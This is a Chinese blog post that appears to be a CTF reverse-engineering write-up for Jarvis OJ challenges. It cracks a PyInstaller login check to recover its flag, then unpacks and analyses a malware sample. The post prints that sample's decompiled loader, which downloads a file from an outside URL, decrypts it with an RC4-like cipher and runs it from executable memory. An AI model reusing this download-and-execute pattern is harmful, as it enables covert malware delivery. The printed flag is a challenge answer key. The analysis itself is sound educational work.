<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        Jarvis OJ部分逆向解题思路 - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#login-exe"><span class="toc-text">login.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Evil-Exe"><span class="toc-text">Evil Exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        Jarvis OJ部分逆向解题思路
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-03-22 21:03:28</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#WP" title="WP">WP</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>……<br><a id="more"></a></p>
<h3 id="login-exe"><a href="#login-exe" class="headerlink" title="login.exe"></a>login.exe</h3><p>用DIE查看发现没有加什么壳</p>
<p>拖入IDA中发现函数很多，查看字符串发现存在大量以“py”开头的，怀疑是用python写的程序，那么之前做安恒赛的时候碰见过一次，可以使用pyinstxtractor.py这个脚本来将exe文件进行分解成打包前的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  py_exe转源码 python pyinstxtractor.py login.exe </span><br><span class="line">[*] Processing login.exe</span><br><span class="line">[*] Pyinstaller version: 2.1+</span><br><span class="line">[*] Python version: 35</span><br><span class="line">[*] Length of package: 3798016 bytes</span><br><span class="line">[*] Found 34 files in CArchive</span><br><span class="line">[*] Beginning extraction...please standby</span><br><span class="line">[+] Possible entry point: pyiboot01_bootstrap</span><br><span class="line">[+] Possible entry point: main</span><br><span class="line">[!] Warning: The script is running in a different python version than the one used to build the executable</span><br><span class="line">    Run this script in Python35 to prevent extraction errors(if any) during unmarshalling</span><br><span class="line">[!] Unmarshalling FAILED. Cannot extract out00-PYZ.pyz. Extracting remaining files.</span><br><span class="line">[*] Successfully extracted pyinstaller archive: login.exe</span><br><span class="line"></span><br><span class="line">You can now use a python decompiler on the pyc files within the extracted directory</span><br><span class="line">➜  py_exe转源码</span><br></pre></td></tr></table></figure>
<p>可以看到多了一个文件夹：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> api-ms-win-crt-conio-l1-1-0.dll         main</span><br><span class="line"> api-ms-win-crt-convert-l1-1-0.dll       main.exe.manifest</span><br><span class="line"> api-ms-win-crt-environment-l1-1-0.dll   out00-PYZ.pyz</span><br><span class="line"> api-ms-win-crt-filesystem-l1-1-0.dll    out00-PYZ.pyz_extracted</span><br><span class="line"> api-ms-win-crt-heap-l1-1-0.dll          pyexpat.cp35-win32.pyd</span><br><span class="line"> api-ms-win-crt-locale-l1-1-0.dll        pyiboot01_bootstrap</span><br><span class="line"> api-ms-win-crt-math-l1-1-0.dll          pyimod01_os_path</span><br><span class="line"> api-ms-win-crt-process-l1-1-0.dll       pyimod02_archive</span><br><span class="line"> api-ms-win-crt-runtime-l1-1-0.dll       pyimod03_importers</span><br><span class="line"> api-ms-win-crt-stdio-l1-1-0.dll        &apos;pyi-windows-manifest-filename main.exe.manifest&apos;</span><br><span class="line"> api-ms-win-crt-string-l1-1-0.dll        python35.dll</span><br><span class="line"> api-ms-win-crt-time-l1-1-0.dll          select.cp35-win32.pyd</span><br><span class="line"> api-ms-win-crt-utility-l1-1-0.dll       _socket.cp35-win32.pyd</span><br><span class="line"> base_library.zip                        _ssl.cp35-win32.pyd</span><br><span class="line"> _bz2.cp35-win32.pyd                     struct</span><br><span class="line"> _ctypes.cp35-win32.pyd                  unicodedata.cp35-win32.pyd</span><br><span class="line"> _hashlib.cp35-win32.pyd                 VCRUNTIME140.dll</span><br><span class="line"> _lzma.cp35-win32.pyd</span><br><span class="line">➜  login.exe_extracted file *</span><br><span class="line">api-ms-win-crt-conio-l1-1-0.dll:                 PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-convert-l1-1-0.dll:               PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-environment-l1-1-0.dll:           PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-filesystem-l1-1-0.dll:            PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-heap-l1-1-0.dll:                  PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-locale-l1-1-0.dll:                PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-math-l1-1-0.dll:                  PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-process-l1-1-0.dll:               PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-runtime-l1-1-0.dll:               PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-stdio-l1-1-0.dll:                 PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-string-l1-1-0.dll:                PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-time-l1-1-0.dll:                  PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">api-ms-win-crt-utility-l1-1-0.dll:               PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">base_library.zip:                                Zip archive data, at least v2.0 to extract</span><br><span class="line">_bz2.cp35-win32.pyd:                             PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, UPX compressed</span><br><span class="line">_ctypes.cp35-win32.pyd:                          PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, UPX compressed</span><br><span class="line">_hashlib.cp35-win32.pyd:                         PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, UPX compressed</span><br><span class="line">_lzma.cp35-win32.pyd:                            PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, UPX compressed</span><br><span class="line">main:                                            data</span><br><span class="line">main.exe.manifest:                               XML 1.0 document, ASCII text, with CRLF line terminators</span><br><span class="line">out00-PYZ.pyz:                                   data</span><br><span class="line">out00-PYZ.pyz_extracted:                         directory</span><br><span class="line">pyexpat.cp35-win32.pyd:                          PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, UPX compressed</span><br><span class="line">pyiboot01_bootstrap:                             data</span><br><span class="line">pyimod01_os_path:                                python 3.5.1- byte-compiled</span><br><span class="line">pyimod02_archive:                                python 3.5.1- byte-compiled</span><br><span class="line">pyimod03_importers:                              python 3.5.1- byte-compiled</span><br><span class="line">pyi-windows-manifest-filename main.exe.manifest: empty</span><br><span class="line">python35.dll:                                    PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, UPX compressed</span><br><span class="line">select.cp35-win32.pyd:                           PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, UPX compressed</span><br><span class="line">_socket.cp35-win32.pyd:                          PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, UPX compressed</span><br><span class="line">_ssl.cp35-win32.pyd:                             PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, UPX compressed</span><br><span class="line">struct:                                          python 3.5.1- byte-compiled</span><br><span class="line">unicodedata.cp35-win32.pyd:                      PE32 executable (DLL) (GUI) Intel 80386, for MS Windows, UPX compressed</span><br><span class="line">VCRUNTIME140.dll:                                PE32 executable (DLL) (console) Intel 80386, for MS Windows, UPX compressed</span><br></pre></td></tr></table></figure></p>
<p>file全部文件发现存在upx加壳的dll文件，那么一个一个去壳，经过测试发现python35.dll中有关键字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  upx-3.91-amd64_linux strings python35.dll| grep &apos;assword&apos; </span><br><span class="line">Password: </span><br><span class="line">➜  upx-3.91-amd64_linux strings python35.dll| grep &apos;UserName&apos;</span><br><span class="line">GetUserNameW</span><br><span class="line">➜  upx-3.91-amd64_linux strings python35.dll| grep &apos;Access Denied!&apos;</span><br><span class="line">Access Denied!</span><br></pre></td></tr></table></figure>
<p>把python35.dll拖入IDA，通过字符串来定位到关键代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_1E183D20(int a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v3; // edx</span><br><span class="line">  int v4; // eax</span><br><span class="line">  int v5; // ecx</span><br><span class="line">  char *Str2; // [esp+4h] [ebp-40Ch]</span><br><span class="line">  int v7; // [esp+8h] [ebp-408h]</span><br><span class="line">  char v8; // [esp+Ch] [ebp-404h]</span><br><span class="line">  char Dst[512]; // [esp+20Ch] [ebp-204h]</span><br><span class="line"></span><br><span class="line">  memset(Dst, 0, 0x200u);</span><br><span class="line">  result = PyArg_ParseTuple(a2, &quot;is&quot;, (unsigned int)&amp;v7);</span><br><span class="line">  if ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1E04E550(&quot;Password: &quot;, (char)Str2);</span><br><span class="line">    sub_1E183CF0(&quot;%s&quot;, (unsigned int)Dst);</span><br><span class="line">    if ( v7 == 4946 &amp;&amp; strlen(Dst) == 16 &amp;&amp; !strncmp(&quot;HXB_Admin&quot;, Str2, 9u) )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = 0;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = Dst[v3];</span><br><span class="line">        v5 = v3 ^ v4 ^ byte_1E253040[v3];</span><br><span class="line">        if ( v3 != (v4 ^ byte_1E253040[v3]) )</span><br><span class="line">          break;</span><br><span class="line">        if ( ++v3 &gt;= 16 )</span><br><span class="line">        &#123;</span><br><span class="line">          memset(&amp;v8, v5, 0x200u);</span><br><span class="line">          sub_1E03CD40(&amp;v8, &quot;Congratulations!\nflag&#123;%s&#125;.&quot;, (unsigned int)Dst);</span><br><span class="line">          return Py_BuildValue(&quot;s&quot;, (unsigned int)&amp;v8);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = Py_BuildValue(&quot;s&quot;, (unsigned int)&quot;Access Denied!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键代码的流程很简单，用户名必须是HXB_Admin，然后密码的长度是16，然后在while循环中一位一位的比较密码，对应的解密脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = [0x50,0x78,0x76,0x6B,0x34,0x6B,0x59,0x63,0x49,0x56,0x6C,0x4A,0x53,0x65,0x4F,0x3F]</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for x in xrange(len(a)):</span><br><span class="line">	flag+= chr(a[x]^x)</span><br><span class="line">print &quot;flag&#123;&quot;+flag+&quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">flag&#123;Pyth0n_dA_fA_hA0&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Evil-Exe"><a href="#Evil-Exe" class="headerlink" title="Evil Exe"></a>Evil Exe</h3><p>readme.txt中的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">挑战：《恶意软件分析》</span><br><span class="line"></span><br><span class="line">赛题背景： 员工小A收到了一封邮件，带一个文档附件，小A随手打开了附件。随后IT部门发现小A的电脑发出了异常网络访问请求，进一步调查发现小A当时所打开的附件其实是一个伪装成word文档的恶意可执行文件。</span><br><span class="line"></span><br><span class="line">赛题描述： 请在试着分析evil.exe和其所下载的x.jpg, 从中找出key.</span><br><span class="line"></span><br><span class="line">评分标准： 密钥正确则可进入下一题。</span><br></pre></td></tr></table></figure>
<p>对evil.exe查壳发现是upx，但是换了好几个UPX脱壳机都没办法正常脱壳，只好手动脱壳了</p>
<p>首先载入OD中<br><img src="https://s2.ax1x.com/2019/03/22/A8fLp6.png" alt><br>流程很简单，但是我不知道为什么pushad和ret有两个断点，害的我全程f9，当eax等于0的时候跳转到了0x43dab0<br><img src="https://s2.ax1x.com/2019/03/22/A8fX6O.png" alt><br><img src="https://s2.ax1x.com/2019/03/22/A8fz0H.png" alt><br>跳转过来之后的第一条汇编代码就是pushad，那么我们在执行过这一句之后对esp下断点：<br><img src="https://s2.ax1x.com/2019/03/22/A8h9AA.png" alt><br>然后f9运行，直接来到popad处，<br><img src="https://s2.ax1x.com/2019/03/22/A8hF9P.png" alt><br>jmp则是跳转到真正的代码处<br><img src="https://s2.ax1x.com/2019/03/22/A8hAc8.png" alt> </p>
<p>此时将程序dump下来，再放入到IDA中我们可以发现成功的载入并且分析<br><img src="https://s2.ax1x.com/2019/03/22/A8hZng.png" alt><br>搜索字符串发现一个路径“<a href="http://www.ddctf.com/x.jpg”，跟踪找到关键代码" target="_blank" rel="noopener">http://www.ddctf.com/x.jpg”，跟踪找到关键代码</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">void *__cdecl sub_4018F0(unsigned int *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v2; // [esp+0h] [ebp-18h]</span><br><span class="line">  DWORD dwNumberOfBytesRead; // [esp+4h] [ebp-14h]</span><br><span class="line">  BOOL v4; // [esp+8h] [ebp-10h]</span><br><span class="line">  void *v5; // [esp+Ch] [ebp-Ch]</span><br><span class="line">  HINTERNET hFile; // [esp+10h] [ebp-8h]</span><br><span class="line">  HINTERNET hInternet; // [esp+14h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  dwNumberOfBytesRead = 0;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  hInternet = InternetOpenA(&quot;DDCTF&quot;, 0, 0, 0, 0);</span><br><span class="line">  hFile = InternetOpenUrlA(hInternet, &quot;http://www.ddctf.com/x.jpg&quot;, 0, 0, 0x4000000u, 0);</span><br><span class="line">  if ( !hFile )</span><br><span class="line">    return 0;</span><br><span class="line">  v5 = malloc(0x100000u);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = InternetReadFile(hFile, (char *)v5 + v2, 0x100000 - v2, &amp;dwNumberOfBytesRead);</span><br><span class="line">    if ( !v4 )</span><br><span class="line">      break;</span><br><span class="line">    v2 += dwNumberOfBytesRead;</span><br><span class="line">    if ( !dwNumberOfBytesRead )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v2 &lt; 0x100000 );</span><br><span class="line">  InternetCloseHandle(hFile);</span><br><span class="line">  if ( v2 &lt;= 0x100000 )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    free(v5);</span><br><span class="line">    v5 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出来，打开一个URL，将存储的信息的地址最后存在a1的参数中然后返回，对该函数名查看交叉引用：<br><img src="https://s2.ax1x.com/2019/03/22/A8heBQ.png" alt><br>发现就一处，那就好办了，这个就是更关键的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)</span><br><span class="line">&#123;</span><br><span class="line">  void *v5; // ST10_4</span><br><span class="line">  char v6; // [esp+4h] [ebp-118h]</span><br><span class="line">  size_t dwSize; // [esp+114h] [ebp-8h]</span><br><span class="line">  void *v8; // [esp+118h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  if ( sub_401370(hInstance) == 6 )</span><br><span class="line">    return 0;</span><br><span class="line">  sub_401620();</span><br><span class="line">  v8 = sub_4018F0(&amp;dwSize);                     // 获取图片数据</span><br><span class="line">  if ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( dwSize )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = malloc(dwSize);</span><br><span class="line">      sub_401740(&amp;v6, -176926348, 4884308);</span><br><span class="line">      sub_401800(&amp;v6, v8, v5, dwSize);</span><br><span class="line">      sub_401220(v5, dwSize);</span><br><span class="line">    &#125;</span><br><span class="line">    free(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先分配一个和图片数据大小一样的空间</p>
<p>函数sub_401740是初始化了一个数组：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_401740(_DWORD *a1, unsigned __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v2; // rax</span><br><span class="line">  char v4[8]; // [esp+0h] [ebp-10h]</span><br><span class="line">  int i; // [esp+Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  LODWORD(v2) = a1;</span><br><span class="line">  *a1 = 0;</span><br><span class="line">  a1[1] = 0;</span><br><span class="line">  for ( i = 0; i &lt; 8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[i] = a2;</span><br><span class="line">    v2 = a2 &gt;&gt; 8;</span><br><span class="line">    a2 &gt;&gt;= 8;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( i = 0; i &lt; 256; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)a1 + i + 8) = i + v4[i % 8];</span><br><span class="line">    LODWORD(v2) = i + 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数sub_401800是根据上一个函数生成的数组和图片的数据生成新数据存在malloc申请的空间中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl sub_401800(int *a1, int a2, int a3, unsigned int a4)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int8 v4; // ST02_1</span><br><span class="line">  unsigned __int8 v5; // ST03_1</span><br><span class="line">  unsigned int i; // [esp+4h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt; a4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = (*a1 + 1) % 256;</span><br><span class="line">    a1[1] = (*(a1 + *a1 + 8) + a1[1]) % 256;</span><br><span class="line">    v4 = *(a1 + *a1 + 8);</span><br><span class="line">    v5 = *(a1 + a1[1] + 8);</span><br><span class="line">    *(a1 + *a1 + 8) = v5;</span><br><span class="line">    *(a1 + a1[1] + 8) = v4;</span><br><span class="line">    *(i + a3) = *(a1 + (v5 + v4) % 256 + 8) ^ *(i + a2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数sub_401220是用VirtualAlloc申请了一个新的内存页，然后定义了一个指针指向这个内存页，随后用memcpy将刚刚的新数据拷贝到这个新的内存页中，然后来了一个for循环，对每一位都和自己的索引进行异或，最后再执行了这段数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__cdecl sub_401220(void *a1, SIZE_T dwSize)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line">  _DWORD *lpAddress; // [esp+0h] [ebp-8h]</span><br><span class="line">  SIZE_T i; // [esp+4h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  result = VirtualAlloc(0, dwSize, 0x1000u, 0x40u);</span><br><span class="line">  lpAddress = result;</span><br><span class="line">  if ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    memcpy(result, a1, dwSize);</span><br><span class="line">    for ( i = 0; i &lt; dwSize; ++i )</span><br><span class="line">      *(lpAddress + i) ^= i;</span><br><span class="line">    if ( _time32(0) - *lpAddress &gt;= 0 &amp;&amp; _time32(0) - *lpAddress &lt;= 1800 )</span><br><span class="line">      result = ((lpAddress + 1))();</span><br><span class="line">    else</span><br><span class="line">      result = VirtualFree(lpAddress, dwSize, 0x4000u);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过我们已经获得到的信息我们可以得知，解密出来的数据是一个可以执行的代码</p>
<p>然后我们一步一步的解密数据：</p>
<ul>
<li>初始化数组：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v4 = [0x74,0x51,0x74,0xf5,0x54,0x87,0x4a,0x00]</span><br><span class="line">arr2 = [0,0,0,0,0,0,0,0]</span><br><span class="line">for x in range(256):</span><br><span class="line">  arr2.append((x+v4[x%8])&amp;0xff)</span><br></pre></td></tr></table></figure>
</li>
</ul>
